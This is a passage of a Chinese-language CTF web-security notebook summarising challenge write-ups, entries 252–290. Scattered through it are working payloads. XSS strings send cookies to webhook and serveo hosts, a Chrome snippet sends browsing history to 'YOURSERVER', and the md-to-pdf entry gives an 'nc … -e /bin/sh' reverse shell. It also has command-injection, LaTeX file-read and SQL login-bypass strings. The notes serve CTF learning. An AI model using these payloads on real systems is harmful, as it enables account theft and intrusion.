这个函数使用了innerHTML。接着又在下面发现了一个调用log函数的地方。
```html
<p>
<input type="text" id="msgInput" value="Hello from the container page."
    style="width:250px">
<input type="button" value="Send" onclick="
    channel.send('log', goog.dom.getElement('msgInput').value)">
</p>
```
index.html又有个peerdomain参数，用于设置交流的网页的域名。所以这个网页是会被打开的，里面的payload也会被执行。那么按照非预期解里的做法，直接往这里面注入xss就行了，完全不需要预期解里那么麻烦。

252. [Postviewer v2](../../CTF/GoogleCTF/Web/Postviewer%20v2.md).
- In js, a regular expression with a global flag cannot be used indefinitely. It's due to the behavior that after a first successful match, the lastIndex will increase and consecutive searches will yield no matches https://stackoverflow.com/questions/1520800/why-does-a-regexp-with-global-flag-give-wrong-results
- CSP bypass: https://terjanq.medium.com/arbitrary-parentheses-less-xss-e4a1cf37c13d . The idea is to find a subpage without a CSP and execute the payload there. A trick that usually works is to open a page with a very long url that will be blocked on the intermediate proxy side because of the overlong headers. Embedding sbx-anything.postviewer2-web.2023.ctfcompetition.com/AAAAA....AAA would work fine for a long sequence of A's.
-  A window can redirect another window if they are in openee-opener relationship. The trick is to call open('URL', 'iframe') that will create such a relationship with an iframe named iframe (e.g. `<iframe name='iframe'>`). This allows the iframe to redirect its opener without user-interaction.
253. [Under Construction](https://github.com/google/google-ctf/tree/master/2023/web-under-construction)
- HTTP parameter pollution. A HTTP query like a=1&a=2 will be interpreted differently by Flask and PHP running on an Apache HTTP Server. In Flask, the parameter will be 1 (first occurence) while in PHP it will be 2 (last occurence). php与python flask的解析差异。post传参时，若遇见重复的值，php取最后一个，flask取第一个
- 类似题目：[Micro](https://github.com/abdoghazy2015/CTF-Write-Ups/tree/main/0xL4ughCTF2024/Web/Micro)
254. [Veggie Soda](https://github.com/google/google-ctf/tree/master/2023/web-vegsoda)
- 在[Oak](https://github.com/oakserver/oak/tree/main)应用程序中，HEAD请求会被看作GET请求。
- typescript反序列化链（[SuperSerial](https://github.com/denostack/superserial)）利用。类似php的反序列化链，在程序中现成的类中找相同函数名但内容截然不同的类组合在一起。
```
It's worth noting that the other classes actually share function names. They perform different things, but they have similar names - and this typically wouldn't be a problem for a type-cautious language, which has generics to assert types... except that all classes in there aren't generic, so generic constructors can't be used, and therefore the program can't assert types in certain situations when dealing with the serializer. This isn't a problem with the serializer, but rather an oversight into the use of generics and type assertions in TypeScript.
```
SuperSerial不处理函数，所以没法像python的pickle那样直接RCE。

255. [peanut-xss](https://github.com/sigpwny/UIUCTF-2023-Public/tree/main/challenges/web/peanut-xss),[wp](https://hackmd.io/@Solderet/UIUCTF-2023-peanut-xss)
- [nutshell](https://github.com/ncase/nutshell/tree/f49c4fc2da746e8d416dd67db3fd47458067fd25)(< 1.0.7) xss漏洞。
- https://github.com/H31s3n-b3rg/CTF_Write-ups/tree/main/UIUCTF_2023/WEB/Peanut-XSS :innerText property decodes the escaped HTML into real HTML。利用这一点，其实直接用转义过后的`<`和`>`加上img标签即可触发xss： https://www.youtube.com/watch?v=Es2LzEQGwDc
256. [Adminplz](https://github.com/sigpwny/UIUCTF-2023-Public/tree/main/challenges/web/adminplz),[wp](https://github.com/H31s3n-b3rg/CTF_Write-ups/tree/main/UIUCTF_2023/WEB/Adminplz)
- log injection:当日志文件可被当成html渲染且对用户可控的记录内容（如用户名）无过滤时，可以多行注入html代码。比如注册一个用户叫`<head>`，再注册另一个用户叫`</head>`，那么中间的日志内容就会被渲染成head标签的内容，换为其他标签即可实现想要的功能。
- 利用`<meta>`标签的重定向提取admin cookie。`<meta http-equiv="refresh" content='0; url=xxx'>`：访问这个meta tag的用户会被立刻重定向到xxx，可以类似xss那样往外带信息。
- java的app.getResource()函数支持多个协议，如`file://`和`http://`等。参考 https://hackmd.io/@Solderet/UIUCTF2023-adminplz
257. [Future Disk](https://github.com/sigpwny/UIUCTF-2023-Public/tree/main/challenges/web/futuredisk),[wp](https://bronson113.github.io/2023/07/03/uiuctf-2023-writeups.html#future-disk-12-),[wp2](https://www.youtube.com/watch?v=Es2LzEQGwDc&t=724s)(视频)
- gzip文件格式详解：https://commandlinefanatic.com/cgi-bin/showarticle.cgi?article=art053
- curl命令有个`--continued-at`选项，其实本质上是使用了range头
- 利用binary search在超大gzip文件中找到储存指定内容的block并使用zlib解码内容（或者使用这个[文章](https://pyokagan.name/blog/2019-10-18-zlibinflate/)里的deflate）。 Since the file is mostly zero, we can assume the first 9 blocks will follow a pretty regular sequence. then there will be one block of a irregular size to store the flag, and the rest of the block back to the regular format. This means that if we can find the block header at the location we expects it, we haven't reach the block containing the flag. Conversely, if we can't find the block header, we have passed the flag block. The only challenge now is to calculate where the header bytes are.
- 其他wp： https://hackmd.io/@pilvar/ByznZMLF3
258. [Rose](https://hackmd.io/@taiwhis/tenable_ctf_2023#Rose)
- flask的flask_login以及`@login_required`装饰器依赖客户端的session cookie。只要获取到secret key后，即可伪造登录后的cookie。`{'_id': '733e330a7ec9ed6ea424339019f73647f4f22319da996eaf78681272ca26abade76c7a9a39a9d707694d6f8f6029c04482e187b5d984638a563f715026db9c96', '_user_id': '1'}`. `_id`和`_user_id`是必须的，用于标记已登录（或者说绕过`@login_required`保护的页面），除此之外还可以加其他题目需要的内容
    - https://github.com/Connor-Maddison/ctf_event_writeups/blob/main/tenable_ctf_2023/rose/Rose_writeup.md ：似乎在session里加上`'is_authenticated': True, '_user_id': '1'`也是可以的
259. [Bad Waf No Donut](https://hackmd.io/@taiwhis/tenable_ctf_2023#Bad-Waf-No-Donut)
- [unicode-normalization](https://hacktricks.boitatech.com.br/pentesting-web/unicode-normalization-vulnerability):字符串经过unicode标准化后，某些不一样的unicode字符最后会标准化成一个。可利用这个特点绕过一些waf和过滤。unicode参考： https://appcheck-ng.com/wp-content/uploads/unicode_normalization.html ， https://qaz.wtf/u/convert.cgi
260. [sequence_gallery](https://siunam321.github.io/ctf/CrewCTF-2023/Web/sequence_gallery/)
- linux dc命令参数注入导致的rce。`-e`选项可以执行一个表达式，但当表达式中出现`!`时，会将剩余的语句当作系统命令执行。
    - `-e"!cat$IFS*.txt%0A`：第一个`"`用于分割命令（这种情况下不是必须的，详情见文档。本来标准是用空格的，这里绕过滤），`$IFS`表示空格也是绕过滤，`%0A`表示换行，不换行命令是不会执行的
    - `-e!cat${IFS}fl*;#`
261. [Positive](https://sh4dy.com/posts/crewCTF-web3-Writeups/#challenge-1--positive),题目源码（包括下面的Infinite和Deception）： https://github.com/Kaiziron/crewctf2023-writeup/
- solidity中也有整形溢出
- cast call和cast send的区分及使用
    - `cast call` is used to perform a call on an account without publishing a transaction. Use `cast call` when you want to retrieve data from the blockchain or execute a function on a smart contract without making any changes to the blockchain state. This is useful for querying information or performing read-only operations. The `cast call` command requires the account address, the function name or signature to call, and the RPC URL of the blockchain network
    - `cast send` is used to send arbitrary messages or transactions between accounts. Use `cast send` when you want to send transactions or messages that will modify the blockchain state. This is useful for executing functions that have side effects, such as updating contract variables or transferring tokens. The `cast send` command requires the private key of the sender account, the recipient account address, and the message or transaction data
262. [Infinite](https://sh4dy.com/posts/crewCTF-web3-Writeups/#challenge-2-infinite)
- [ERC-20 token](https://ethereum.org/en/developers/docs/standards/tokens/erc-20/)使用案例
    - approve(spender addr,amount)：允许addr处的contract使用amount这么多的token（所有者使用该函数后其他contract才能使用transferFrom将最多amount的token从所有者那里转走）
    - allowance(spender,this)：返回spender（token所有者）允许被转走的token数量
    - balanceOf(addr):返回addr拥有的token数量
- 使用forge释放contract:`forge create file.sol:<contract_name> --private-key <private_key> --rpc-url <rpc_url>`
263. [Deception](https://sh4dy.com/posts/crewCTF-web3-Writeups/#challenge-3-deception)
- 利用cast code获取指定地址处的contract的bytecode
- 使用cast storage分析指定地址处的contract的storage layout：`cast storage <contract_addr> <storage_slot_num> --rpc-url <rpc_url>`
- 使用cast send调用含参数的函数
264. [Safe Proxy](https://untrue.me/writeups/crewctf2023/safe-proxy/)
- [deno](https://github.com/denoland/deno)(A modern runtime for JavaScript and TypeScript)允许fetch函数的参数为`file://`，即可以通过fetch获取本地文件。
- `$DENO_DIR`默认为`$HOME/.deno`
- https://denolib.gitbook.io/guide/advanced/deno_dir-code-fetch-and-cache ：`$DENO_DIR/deps` is used to store files fetched through remote url import. It contains subfolders based on url scheme (currently only http and https), and store files to locations based on the URL path. 例如，`import {xxx} from "http://host:8082/?token=abc";`，则文件出现于`$DENO_DIR/deps/http/host_PORT8082/`。另外，根据 https://github.com/denoland/deno/blob/21cc279481ac5bffc29641e917e868dca42189d3/cli/cache/http_cache.rs#L69 ，文件名需要hash。因此文件的完整路径为`$DENO_DIR/deps/http/host_PORT8082/fe9300653ae3ecb588a5562dc46e30e3ded89c07dbdbb3d86f2f47a5dc7dde3c`(`fe9300653ae3ecb588a5562dc46e30e3ded89c07dbdbb3d86f2f47a5dc7dde3c=sha256(b"/?token=abc").hexdigest()`)
- 在`deno/`文件夹下有个`dep_analysis_cache_v1`文件，a sqlite database storing information about the imported modules. This file contains the full url used when making the requestThis file contains the full url used when making the request, 包括port和get参数
265. [Hex2Dec](https://github.com/L-T-B/CTFS/blob/main/crew-ctf/web/hex2dec.md)
- 使用“0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_`abcde +-”的字符集构建xss代码。以下是一些构造的技巧
    - 调用函数时括号不是必须的。如"alert`XSS`"等于`alert("XSS")`。更多参考 https://stackoverflow.com/questions/35949554/invoking-a-function-without-parentheses
    - 可以用方括号访问属性。 https://dmitripavlutin.com/access-object-properties-javascript/
    - 可以用元素的id访问html里的元素。假设有一个div元素`<DIV ID=XSS>`（无需`</div>`，大小写不重要），则在js里可以通过XSS来获取这个元素。配合上一点，"XSS[`ownerDocument`]"能获取到Document元素（使用`号还是引号'不重要）
    - jsfuck构造任意字符技巧： https://github.com/aemkei/jsfuck 。不过需要的字符很多，而且要eval，若csp不允许eval则无法使用。里面的字符构造技巧还是值得参考的。相关链接： https://stackoverflow.com/questions/63673610/alternative-way-to-get-c-letter-in-jsfuck
- 其他payload
    ```html
    <DIV ID=XSS><IMG SRC=X ONERROR=A=`a`;B=`b`;C=`c`;D=`d`;E=`e`;F=`f`;INF=+`1e10001`;INFSTR=INF+[];I=INFSTR[3];N=INFSTR[1];T=INFSTR[6];Y=INFSTR[7];FALSE=1==0;FALSE=FALSE+[];L=FALSE[2];S=FALSE[3];TRUE=1==1;TRUE=TRUE+[];R=TRUE[1];U=TRUE[2];FLAT=[][F+L+A+T];FLAT=FLAT+[];O=FLAT[6];V=FLAT[27];EMPTYSTRING=[]+[];STRING=EMPTYSTRING[C+O+N+S+T+R+U+C+T+O+R];STRINGSTR=STRING+[];G=STRINGSTR[14];NUMBER=0[C+O+N+S+T+R+U+C+T+O+R];NUMBER=NUMBER+[];M=NUMBER[11];G=STRING[N+A+M+E][5];H=101[T+O+`S`+T+R+I+N+G]`21`[1];K=20[T+O+`S`+T+R+I+N+G]`21`;P=211[T+O+`S`+T+R+I+N+G]`31`[1];Q=212[T+O+`S`+T+R+I+N+G]`31`[1];V=31[T+O+`S`+T+R+I+N+G]`32`;W=32[T+O+`S`+T+R+I+N+G]`33`;X=101[T+O+`S`+T+R+I+N+G]`34`[1];Z=35[T+O+`S`+T+R+I+N+G]`36`;ARRAYITER=[]+[][E+N+T+R+I+E+S]``;J=ARRAYITER[3];PERIOD=+`11e100`+[];PERIOD=PERIOD[1];FORWARDSLASH=STRING[F+R+O+M+`C`+H+A+R+`C`+O+D+E]`47`;XSS[O+W+N+E+R+`D`+O+C+U+M+E+N+T][L+O+C+A+T+I+O+N]=FORWARDSLASH+FORWARDSLASH+Y+Z+3+0+J+S+Y+L+PERIOD+R+E+Q+U+E+S+T+R+E+P+O+PERIOD+C+O+M+`?`+XSS[O+W+N+E+R+`D`+O+C+U+M+E+N+T][C+O+O+K+I+E]>
    ```
    ```py
    def gen_str(s):
    chars = []
    for c in s:
        if c.islower():
            idx = ord(c) - ord("a")
            chars.append(f"X[{idx}]")
        elif c == "`":
            chars.append(f"`\\``")
        elif c == "\\":
            chars.append(f"`\\\\`")
        else:
            chars.append(f"`{c}`")
    return "+".join(chars)
    def gen_unicode_str(s):
        return "".join([f"\\u{ord(c):04X}" for c in s]) #将参数表示成\uxxxx的形式
    webhook = "https://webhook.example.com/?"
    payload = "<A ID=A HREF=ABCDEFGHIJKLMNOPQRSTUVWXYZ:>" #这里A标签的id是A，所以js里可以用A访问。下面A+``直接获取到HREF内容的小写
    payload += "<IMG SRC ONERROR="
    payload += "X=A+``;"
    payload += f"HREF={gen_str('href')};"
    payload += f"CLICK={gen_str('click')};"
    payload += f"COOKIE={gen_str('cookie')};"
    payload += f"A[HREF]={gen_str(f'javascript:location[HREF]=`{gen_unicode_str(webhook)}`+document[COOKIE]')};"
    payload += f"A[CLICK]``;"
    payload += ">"
    print(payload)
    ```
    ```html
    <K ID=A><DIV ID=B><IMG SRC ID=AA ONERROR=DOT=[A[[A+[]][0][1]+[A+[]][0][17]+[A+[]][0][18]+[A+[]][0][4]+[[1==1]+[]][0][1]+[B+[]][0][12]+[A+[]][0][1]+[A+[]][0][5]+[[][[]]+[]][0][0]+[A+[]][0][22]+[A+[]][0][4]+[A+[]][0][18]+[A+[]][0][25]][[A+[]][0][20]+[A+[]][0][1]+[A+[]][0][5]+[[1<1]+[]][0][1]+[A+[]][0][25]+[B+[]][0][13]+[A+[]][0][1]+[A+[]][0][18]]+[]][0];AA[[A+[]][0][1]+[A+[]][0][17]+[A+[]][0][18]+[A+[]][0][4]+[[1==1]+[]][0][1]+[B+[]][0][12]+[A+[]][0][1]+[A+[]][0][5]+[[][[]]+[]][0][0]+[A+[]][0][22]+[A+[]][0][4]+[A+[]][0][18]+[A+[]][0][25]][[A+[]][0][20]+[A+[]][0][1]+[A+[]][0][5]+[[1<1]+[]][0][1]+[A+[]][0][25]+[B+[]][0][13]+[A+[]][0][1]+[A+[]][0][18]]=`HTTPS:`+DOT[5]+DOT[5]+`IMBRIUM`+DOT[18]+`SERVEO`+DOT[18]+`NET?C=`+AA[[A+[]][0][1]+[A+[]][0][17]+[A+[]][0][18]+[A+[]][0][4]+[[1==1]+[]][0][1]+[B+[]][0][12]+[A+[]][0][1]+[A+[]][0][5]+[[][[]]+[]][0][0]+[A+[]][0][22]+[A+[]][0][4]+[A+[]][0][18]+[A+[]][0][25]][[A+[]][0][5]+[A+[]][0][1]+[A+[]][0][1]+[A+[]][0][14]+[B+[]][0][13]+[A+[]][0][4]]>
    ```
266. 测试xss时，payload不要只用简单的`alert(1)`,建议用`alert(document.domain)`和`alert(window.origin)`，这些payload可以反馈payload被执行的位置。 https://liveoverflow.com/do-not-use-alert-1-in-xss/
267. [jqi](https://github.com/zer0pts/zer0pts-ctf-2023-public/tree/master/web/jqi),[wp](https://nanimokangaeteinai.hateblo.jp/entry/2023/07/17/101119#Web-149-jqi-40-solves)
- [node-jq](https://github.com/sanack/node-jq)（语法和[jq](https://jqlang.github.io/jq/manual/v1.6/)一样，node-jq其实是个node js wrapper） error based（盲注）注入。引发的原因和sql注入一样，没有对用户的输入进行过滤就直接拼接上query语句。查询条件之间用`|`分割,可以用引号或者[string interpolation](https://jqlang.github.io/jq/manual/v1.6/#string-interpolation)或者`\`（要求插入的内容正好在引号的前面，从而转义引号）逃逸从而插入恶意的条件
    - error based注入基于无查询内容回显的题目。可以利用if-then-else语句构造1/0来引发错误，或者直接error函数。
    - 可以在jq里直接访问环境变量
268. [neko-note](https://github.com/zer0pts/zer0pts-ctf-2023-public/tree/master/web/neko-note),[wp](https://nanimokangaeteinai.hateblo.jp/entry/2023/07/17/101119#Web-181-Neko-Note-26-solves)
- go web应用下的xss。本题的xss基于attribute injection。程序将用户输入作为字符串插入a标签的属性，但属性没有加双引号，导致用户可以逃逸出当前属性，添加可触发xss的属性。如onanimationend+style属性：`onanimationend=alert(1) style=animation-name:wag;animation-duration:0s`(要求引入的css里有个名为wag的`@keyframes`),或者onmouseover：`onmouseover=alert(1)`(要求admin bot有点击a标签的操作)
    - 若bot输入我们要泄露的敏感内容后又删除：
        ```js
        await page.focus('input');
        for (let i = 0; i < len; i++) {
            await page.keyboard.press('Backspace');
        }
        ```
        可以用`document.execCommand('undo');`将刚才删除的内容恢复回来
    - 带出敏感信息除了可以用location，fetch，还能用[navigator.sendBeacon](https://developer.mozilla.org/en-US/docs/Web/API/Navigator/sendBeacon)
269. [plain-blog](https://github.com/zer0pts/zer0pts-ctf-2023-public/tree/e9f71aeaab764d36ce9378b1f079af8fd4651bdc/web/plain-blog)
- 后端ruby+前端js web应用。不对用户可控数据进行过滤导致的原型链污染。
    ```js
    let posts = {};
    post = posts[id];
    ```
    这里用户若可随意控制id，可让id=`__proto__`，这样`posts[__proto__]`获取到的就是Object.prototype了。
    - 一种利用方式是用在fetch。当我们污染了`Object.prototype.headers`，就算调用fetch函数时options里没有headers，被污染的headers仍然会一并发出去。一个好用的header是[X-HTTP-Method-Override](https://www.sidechannel.blog/en/http-method-override-what-it-is-and-how-a-pentester-can-use-it/)（参考 https://github.com/rack/rack/blob/54990d39446caf046b5cbf19fd030204f850b480/lib/rack/method_override.rb#L31-L40 ，ruby的web模块会用这个header），假设用户`POST xxx`,但是加上了`X-HTTP-Method-Override: PUT`，那么服务器那边最终收到的是PUT。
- 每次请求数据都应刷新。
    ```js
    let posts = {}, data, post;
    for (const id of ids) {
        const res = await (await request('GET', `/api/post/${id}`)).json();
        if (res.post) {
            data = res.post;
        }
        //do something with data
    }
    ```
    若用户构造不存在的id，data就不会被更新，而是继承了之前的值，属于逻辑错误。
- ruby里的params['permission']包含请求参数，不仅仅是request body and path parameters
270. [ringtone](https://github.com/zer0pts/zer0pts-ctf-2023-public/tree/master/web/ringtone)
- 当题目用上DomPurify而目标是进行xss时，有以下两种可能：
    - dompurify不是最新版本，可用旧版的漏洞绕过（基本不考虑要求找0day）
    - dompurify是最新版本且没有已知漏洞，那么漏洞出在题目的其他代码，考虑其他代码的漏洞，尤其是dom clobbering
- dom clobbering的复杂情况。`users.privileged.dataset.admin`如何用html代码表示？`<form id=users><img name=privileged data-admin="value"></form>`是一种，也可以用:
    ```html
    <div id=users></div>
    <div id=users name=privileged data-admin="value"></div>
    ```
    注意两个`<div>`是必须的，一个div是取不到的。dataset是一个特殊的属性，可以取到任何以`data-`开头的attribute的值，参考 https://developer.mozilla.org/en-US/docs/Learn/HTML/Howto/Use_data_attributes
- xss js（chrome api）相关
    - 调用history api获取历史打开的tab的url
        ```js
        chrome.history.search({text:``,maxResults:10},function(data){data.forEach(function(page){fetch(`http://YOURSERVER?a=`%2Bpage.url);});});
        ```
    - 创建一个new tab
        ```js
        t=chrome.tabs.create({url:"url"})
        ```
    - 对指定tab id的tab的可见部分截图并带出webhook
        ```js
        chrome.tabs.captureVisibleTab(windowId).then(function(data){fetch("url",{method:/POST/.source,body:data})})
        ```
271. [Warmuprofile](https://blog.arkark.dev/2023/07/17/zer0pts-ctf/)
- 处理多线程很麻烦，如果只是一些简单的操作(shell用命令直接实现的)，直接用python的`subprocess.run`就好了。或者直接用shell命令：https://stackoverflow.com/questions/46362284/run-multiple-curl-commands-in-parallel ，简单的条件竞争可以用
272. [latek](https://github.com/D13David/ctf-writeups/tree/main/amateursctf23/web/latek)
- [Latex injection](https://salmonsec.com/cheatsheets/exploitation/latex_injection)
    - 其它payload
        ```latex
        \documentclass{article}
        \usepackage{verbatim}
        \begin{document} 
        \verbatiminput{/flag.txt}
        \end{document} 
        ```
        - 单纯`\input{/flag.txt}`可能读不全文件，加个batchmode即可
        ```latex
        \batchmode
        \input{/flag.txt}
        ```
        类似的还有以下payload，也会把flag内容渲染到pdf但是有格式（比如flag内容有latex语法就会把latex二次渲染后的渲染上）
        ```latex
        \documentclass{article}
        \begin{document}
        $\input{/flag.txt}$
        \end{document}
        ```
        - https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/LaTeX%20Injection
        - https://book.hacktricks.xyz/pentesting-web/formula-doc-latex-injection#latex-injection
273. [uwuctf](https://github.com/L-T-B/CTFS/blob/main/amateursCTF/web/uwuctf.md)
- `cat [filename]|xxx`，若filename可控制，尝试在文件名后加个null字符(\x00,%00)就可以截断命令，cat出来的文件内容不会进入后续xxx命令
274. [sanity](https://github.com/Crypto-Cat/CTF/blob/main/ctf_events/amateurs_23/web/sanity.md)
- dom clobbering+原型链污染
    - `window.debug.extension.toString()`可用`<a id="debug"></a><a id="debug" name="extension" href="content"></a>` clobber，获取的内容为content
    - dompurify预防dom clobbering，但chrome的Sanitizer暂时不能
    - 我一直疑惑为啥这样dom就能取到东西？看了另一篇[wp](https://justinapplegate.me/2023/amactf-sanity/)和[hacktricks](https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/dom-clobbering)才了解。js里，若有2个html object有相同的id，它们就会被转化成array，然后第二个元素的名字会变成其attribute名称。这种x.y的可以用a标签，如果是x.y.z的就要用form了
- js的fetch的参数可以是data url。如fetch `data:;,{"__proto__":{"sanitize":0}}`会得到`{"__proto__":{"sanitize":0}}`
- 如果用ngrok host网站时得到 `No 'Access-Control-Allow-Origin' header is present on the requested resource.`报错，可以在启动ngrok时加上`--request-header-add "Access-Control-Allow-Origin: *"`选项，或者在网站本身加上`Access-Control-Allow-Origin` header
275. [cps remastered](https://github.com/les-amateurs/AmateursCTF-Public/tree/main/2023/web/cps),[wp](https://github.com/quasar098/ctf-writeups/tree/main/amateursctf-2023/cps-remastered)
- insert语句处的sql注入。无错误回显所以无法报错注入爆出信息。但是可以利用LIKE语句从数据库里拿出数据后在注册的用户名处回显
    - 如果有update权限的话甚至可以把flag提取到password字段 https://ireland.re/posts/AmateursCTF/
276. markdown to pdf(md-to-pdf) RCE: https://security.snyk.io/vuln/SNYK-JS-MDTOPDF-1657880
- 读文件payload：`((require("child_process")).execSync("cat /flag.txt"))`,`((require("fs")).readFileSync("/flag.txt"))`
- 反弹shell payload:`((require("child_process")).execSync("nc ip port -e /bin/sh"))`
- alpine container包含的功能很少，比如没有bash
277. [Node Serialize](https://github.com/luin/serialize/tree/master) rce：https://blog.websecurify.com/2017/02/hacking-node-serialize （从Exploit Setup开始是漏洞详细信息）
278. [Payback](https://discord.com/channels/818117978536017952/1132660345824083978)(wp在discord里，该服务器的邀请链接：https://discord.com/invite/MXdFD6WeTR )
- 若burpsuite访问网站时提示unknown host但普通浏览器可以正常访问，尝试将host写入本地`/etc/hosts`文件
- `.dbshell`：MongoDB client uses it as history file for the MongoDB CLI client
- `/etc/nginx/sites-enabled`为nginx config file所在的文件夹
- 若可以用ssh访问远程机器的一个内网网站，则能利用ssh将其转发。`ssh -L <remote_port>:<local_host>:<local_port>`,如`ssh -L 3000:127.0.0.1:3000`,将远程的3000端口映射到本机的3000端口。 https://www.cnblogs.com/dwtfukgv/articles/12837356.html
- EJS template engine ssti。可用`<%= 2*2 %>`测试，回显4则有ssti
    - 此时可以尝试RCE payload了，不过要是禁止了require的话会比较困难
    - 还能考虑`.env`文件。 The file .env is popular with NodeJS applications, and it's commonly used to store secrets like database credentials and API keys. This file is typically imported using the dotenv module, which parses and store it into the process.env object. 可用`<%= JSON.stringify(process.env) %>`读取
- `mongodb://`开头的url可在命令行用`mongodb mongodb://xxx`访问
279. [idoriot](https://github.com/Crypto-Cat/CTF/blob/main/ctf_events/imaginary_23/web/idoriot.md)
- [IDOR](https://portswigger.net/web-security/access-control/idor)漏洞：指攻击者可控制程序用于设定权限的参数。比如`http://xxx.com/?user_id=1`中的user_id用于控制权限，但用户可随意设置，导致提权
280. [Amogus](https://github.com/ixSly/CTFs/blob/master/ImaaginaryCTF/Amogus.md)
- 利用`<object>`进行xs leak.这个技巧在 https://xsleaks.dev/docs/attacks/element-leaks/#when-javascript-cant-be-used 和 https://book.hacktricks.xyz/pentesting-web/xs-search#event-handler-techniques 均有提到
```html
<object data="//example.com">
  <object data="//attacker.com"></object>
</object>
```
若`example.com`返回错误（比如404），就会访问`attacker.com`
- xs leak题目的特征也是有admin bot，且会提供搜索功能。可以拿题目的csp来[网站](https://csp-evaluator.withgoogle.com/)看一眼，缺什么csp就考虑什么样的攻击手段
281. php类型混淆（type juggling）。`"anystring"==0`成立，不同的hash值只需前两个字符都为0e且后续字符只有数字即可被判定为相等。更多参考 https://owasp.org/www-pdf-archive/PHPMagicTricks-TypeJuggling.pdf 和 https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Type%20Juggling
282. [Login](https://github.com/ImaginaryCTF/ImaginaryCTF-2023-Challenges/tree/main/Web/login),[wp](https://f0rk3b0mb.github.io/p/imaginaryctf2023/#login)
- 如果sql查询语句有注入漏洞，即使使用php的password_verify也无法阻止这点。参考 https://stackoverflow.com/questions/50756182/sql-injection-with-password-verify
```php
$res = $db->querySingle("SELECT username, pwhash FROM users WHERE username = '$username'", true);
if (password_verify($password, $res['pwhash'])) //...
```
除了可以在sql语句处爆出数据库内容，还能绕过登录。`' UNION SELECT 'admin' AS username,'fake_hash' AS pwhash--`,利用union伪造一条查询结果。fake_hash为提前计算好的自行输入的任意password
- 形如`$2y$10$C4lfi0f8kouggVBFkKF1ru./NEQTKqptjJCh6JI/hJieELWHLeFXi`是bcrypt hash。bcrypt限制hash内容的长度为72，意味着若hash的内容超过72后，只会取前72个字符进行hash，剩下的就丢掉了。若flag被拼接到可控制的输入后面且会返回hash的结果，可执行oracle攻击获取flag。原理：构造长度为71的任意pad字符串，尾部拼接flag后hash的内容就会携带flag的第一个字符。oracle返回pad+flag[0]的hash，就能拿着这个hash自行爆破，拿到第一个字符。然后pad长度减一，尾部拼接flag后hash的内容就会携带flag的前两个字符。拿到hash后自己拿pad+之前获取到的flag爆破即可。后面的flag以此类推
283. [Sanitized](https://github.com/maple3142/My-CTF-Challenges/tree/master/ImaginaryCTF%202023/Sanitized),[题目](https://github.com/ImaginaryCTF/ImaginaryCTF-2023-Challenges/tree/main/Web/sanitized),[Sanitized Revenge](https://github.com/maple3142/My-CTF-Challenges/tree/master/ImaginaryCTF%202023/Sanitized%20Revenge),[题目](https://github.com/ImaginaryCTF/ImaginaryCTF-2023-Challenges/tree/main/Web/sanitized-revenge)
- dompurify默认使用html parser，所以无法正确处理[xhtml](https://www.zhihu.com/question/19783105)文件的dom clobbering（正确设置：`{PARSER_MEDIA_TYPE: 'application/xhtml+xml'}`）。可以用CDATA+`<style>`绕过,得到xss
- 让`<script>`标签插入innerhtml里触发的唯一做法是用`<iframe srcdoc="...">`.xhtml里不能用`<`，还可以用`&lt;`
- html和xhtml对`<!---->`的解析有差异。HTML comment inside script tag is ignored by HTML parser，但xhtml仍会将其视作注释
- xhtml文件可用非ascii字符作tag名来绕过dompurify的html正则检测。这是因为html限制只能用ascii字符，但是xhtml没有这个限制
- 作者说此题的灵感来源： https://jakearchibald.com/2023/against-self-closing-tags-in-html/
284. [Baby Ducky Notes: Revenge](https://ireland.re/posts/TheFewChosen_2023/#baby-ducky-notes-revenge)
- 在python flask中：
```html
<p> {{post.get('content') | safe}} </p>
```
表示flask不会对content的内容进行过滤，意味着可能有xss

285. [Cookie Store](https://ireland.re/posts/TheFewChosen_2023/#cookie-store)
- 若xss题目中bot有提交form的操作，可以尝试污染dom：`<input type="submit" formaction="server"/>`。formaction要比action优先级更高，会将bot导向攻击者的server
286. [gas](../../CTF/moectf/2023/Web/gas.md)
- python requests处理flask session cookie
    - 如何保持post/get时服务器下发的cookie（session.post）
    - 如何解码cookie（requests.utils.dict_from_cookiejar）
287. [出去旅游的心海](../../CTF/moectf/2023/Web/出去旅游的心海.md)
- sql insert/update/delete语句报错注入： https://wooyun.js.org/drops/%E5%88%A9%E7%94%A8insert%EF%BC%8Cupdate%E5%92%8Cdelete%E6%B3%A8%E5%85%A5%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE.html
288. [moeworld](../../CTF/moectf/2023/Web/moeworld.md)
- 内网端口扫描工具[fscan](https://github.com/shadow1ng/fscan)使用
- python pymysql模块连接sql数据库以及查询数据
- python使用redis模块连接redis服务器以及利用[redis未授权访问漏洞](https://_thorns.gitbooks.io/sec/content/redis_getshellzi_dong_hua_shi_jian_zhi_ssh_key.html)
- 使用python paramiko模块连接ssh： https://www.cnblogs.com/wongbingming/articles/12384764.html
289. [Fetch](https://github.com/4rr4y/ctf-writeups/blob/main/2023_LITCTF/Web_Fetch.md)
- js window.XMLHttpRequest拦截器。覆盖window.XMLHttpRequest的open和send来让函数执行额外的逻辑
```html
<html>
    <head>
        <script>window.XMLHttpRequest = class _ { constructor(){};send(a){};open(a,b,c) {let e=document.createElement("iframe");e.src=b;document.body.appendChild(e);}}</script>
    </head>
    <body><h1></h1></body>
</html>
```
```html
<html>
<body>
    <h1 id="h">test</h1>
    <script>
        window.XMLHttpRequest.prototype.open = (...args) => {
            fetch(args[1])
                .then((res) => res.text())
                .then(txt => document.getElementById("h").innerHTML = txt.replace(/(.{10})/g, '$1\n') + "**DONE**")
        }
        window.XMLHttpRequest.prototype.send = () => { }
    </script>
</body>
</html>
```
290. [Art Contest](https://blog.junron.dev/writeups/web/art-contest.html),[wp2](https://ireland.re/posts/Lexington_Informatics_Tournament_CTF_23/#art-contest)
- python的os.path.splitext函数有特殊情况：路径最后一个部分前面的点号属于root路径的一部分
```py
>>> splitext('.cshrc')
('.cshrc', '')
>>> splitext('/foo/....jpg')
('/foo/....jpg', '')
```
- chrome中，名为html的文件不会被当成html渲染，但名为`.html`的文件会
- 浏览器的沙盒禁止用js读取磁盘上的文件
- 可以用window.open函数开启一个新的页面。虽然通常会被浏览器的弹出窗口拦截器给拦截，但是在诸如Playwright的模拟环境中不会。页面可通过playwright context.pages[index]按开启的顺序取得
